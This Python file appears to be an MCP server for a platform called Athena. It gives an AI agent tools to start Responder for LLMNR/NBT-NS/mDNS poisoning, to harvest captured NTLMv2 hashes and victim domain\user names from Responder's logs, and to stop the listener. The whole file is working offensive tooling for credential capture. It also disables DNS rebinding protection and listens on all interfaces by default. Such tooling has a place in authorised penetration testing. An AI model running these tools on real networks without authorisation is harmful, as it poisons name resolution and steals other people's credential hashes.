"""responder-capture MCP Server for Athena.

Responder-based LLMNR/NBT-NS/mDNS poisoning + NTLMv2 hash capture.
Uses start/collect/stop three-phase model for the long-running listener.
Returns JSON with {"facts": [{"trait": ..., "value": ...}]}
to integrate with Athena's fact collection pipeline.
"""

import asyncio
import json
import os
import re
import signal

from mcp.server.fastmcp import FastMCP
from mcp.server.transport_security import TransportSecuritySettings

_security = TransportSecuritySettings(
    enable_dns_rebinding_protection=False,
)

mcp = FastMCP("athena-responder-capture", transport_security=_security)

_active_sessions: dict[str, int] = {}  # session_id -> pid

RESPONDER_PATH = "/opt/Responder/Responder.py"
RESPONDER_LOG_DIR = "/opt/Responder/logs"


async def _run_command(cmd: list[str], timeout: int = 120) -> tuple[str, str, int]:
    """Run subprocess asynchronously with timeout."""
    proc = await asyncio.create_subprocess_exec(
        *cmd,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
    )
    try:
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
    except asyncio.TimeoutError:
        proc.kill()
        return "", "Command timed out", -1
    return (
        stdout.decode(errors="replace"),
        stderr.decode(errors="replace"),
        proc.returncode or 0,
    )


@mcp.tool()
async def responder_start(
    interface: str = "eth0",
    analyze_mode: bool = True,
    timeout: int = 120,
) -> str:
    """Start Responder for LLMNR/NBT-NS poisoning (default: analyze-only mode).

    Args:
        interface: Network interface to listen on
        analyze_mode: If True, run in analyze-only mode (passive, no poisoning)
        timeout: Maximum runtime in seconds before auto-stop

    Returns:
        JSON with facts: ad.responder_session
    """
    facts: list[dict[str, str]] = []

    try:
        cmd = ["python3", RESPONDER_PATH, "-I", interface]
        if analyze_mode:
            cmd.append("-A")

        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )

        session_id = f"responder-{proc.pid}"
        _active_sessions[session_id] = proc.pid

        # Check if process started successfully
        try:
            await asyncio.wait_for(proc.wait(), timeout=3)
            stdout_data = await proc.stdout.read() if proc.stdout else b""
            stderr_data = await proc.stderr.read() if proc.stderr else b""
            return json.dumps({
                "facts": [],
                "raw_output": (stdout_data + stderr_data).decode(errors="replace")[:4000],
                "error": {"type": "StartupError", "message": "Responder exited immediately"},
            })
        except asyncio.TimeoutError:
            pass  # Good - process is still running

        facts.append({
            "trait": "ad.responder_session",
            "value": json.dumps({
                "session_id": session_id,
                "pid": proc.pid,
                "interface": interface,
                "analyze_mode": analyze_mode,
                "status": "running",
            }),
        })

        async def _auto_stop() -> None:
            await asyncio.sleep(timeout)
            try:
                os.kill(proc.pid, signal.SIGTERM)
                _active_sessions.pop(session_id, None)
            except OSError:
                pass

        asyncio.create_task(_auto_stop())

        return json.dumps({
            "facts": facts,
            "raw_output": f"Responder started on {interface} (PID: {proc.pid}, analyze={analyze_mode})",
        })

    except Exception as exc:
        return json.dumps({
            "facts": [],
            "raw_output": "",
            "error": {"type": type(exc).__name__, "message": str(exc)},
        })


@mcp.tool()
async def responder_collect(
    session_id: str = "",
) -> str:
    """Collect captured NTLMv2 hashes from Responder logs.

    Args:
        session_id: Optional session ID (if empty, reads all logs)

    Returns:
        JSON with facts: credential.ntlmv2_hash, ad.responder_victim
    """
    facts: list[dict[str, str]] = []

    try:
        log_dir = RESPONDER_LOG_DIR

        if not os.path.isdir(log_dir):
            return json.dumps({
                "facts": [],
                "raw_output": f"Log directory {log_dir} not found",
                "error": {"type": "NotFoundError", "message": f"Responder log directory not found: {log_dir}"},
            })

        hash_files = [
            os.path.join(log_dir, f)
            for f in os.listdir(log_dir)
            if os.path.isfile(os.path.join(log_dir, f))
            and ("NTLM" in f or "Hash" in f or f.endswith(".txt"))
        ]

        victims: set[str] = set()
        raw_lines: list[str] = []

        for hf in hash_files:
            try:
                with open(hf) as fh:
                    for line in fh:
                        stripped = line.strip()
                        if not stripped or stripped.startswith("#"):
                            continue
                        raw_lines.append(stripped)

                        ntlm_match = re.match(
                            r"^([\w.]+)::([\w.]+):([a-fA-F0-9]+):([a-fA-F0-9]+):",
                            stripped,
                        )
                        if ntlm_match:
                            user = ntlm_match.group(1)
                            domain = ntlm_match.group(2)
                            facts.append({"trait": "credential.ntlmv2_hash", "value": stripped[:200]})
                            victim = f"{domain}\\{user}"
                            if victim not in victims:
                                victims.add(victim)
                                facts.append({"trait": "ad.responder_victim", "value": victim})
                        elif re.match(r"^[\w.]+::[\w.]*:[a-fA-F0-9]+:[a-fA-F0-9]+", stripped):
                            facts.append({"trait": "credential.ntlmv2_hash", "value": stripped[:200]})
            except OSError:
                continue

        return json.dumps({"facts": facts, "raw_output": "\n".join(raw_lines[:50])[:4000]})

    except Exception as exc:
        return json.dumps({
            "facts": [],
            "raw_output": "",
            "error": {"type": type(exc).__name__, "message": str(exc)},
        })


@mcp.tool()
async def responder_stop(
    session_id: str = "",
) -> str:
    """Stop Responder process.

    Args:
        session_id: Session ID to stop (if empty, stops all sessions)

    Returns:
        JSON with facts: ad.responder_stopped
    """
    facts: list[dict[str, str]] = []

    try:
        stopped: list[str] = []

        if session_id and session_id in _active_sessions:
            pid = _active_sessions.pop(session_id)
            try:
                os.kill(pid, signal.SIGTERM)
                stopped.append(session_id)
            except OSError:
                pass
        elif not session_id:
            for sid, pid in list(_active_sessions.items()):
                try:
                    os.kill(pid, signal.SIGTERM)
                    stopped.append(sid)
                except OSError:
                    pass
            _active_sessions.clear()
        else:
            stdout, _, _ = await _run_command(["pgrep", "-f", "Responder.py"])
            for pid_str in stdout.strip().splitlines():
                try:
                    os.kill(int(pid_str.strip()), signal.SIGTERM)
                    stopped.append(f"pid-{pid_str.strip()}")
                except (OSError, ValueError):
                    pass

        facts.append({
            "trait": "ad.responder_stopped",
            "value": json.dumps({
                "stopped_sessions": stopped,
                "remaining_sessions": list(_active_sessions.keys()),
            }),
        })

        return json.dumps({
            "facts": facts,
            "raw_output": f"Stopped {len(stopped)} Responder session(s)",
        })

    except Exception as exc:
        return json.dumps({
            "facts": [],
            "raw_output": "",
            "error": {"type": type(exc).__name__, "message": str(exc)},
        })


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--transport",
        default="stdio",
        choices=["stdio", "sse", "streamable-http"],
    )
    parser.add_argument("--host", default="0.0.0.0")
    parser.add_argument("--port", type=int, default=8080)
    args = parser.parse_args()

    mcp.settings.host = args.host
    mcp.settings.port = args.port
    mcp.run(transport=args.transport)
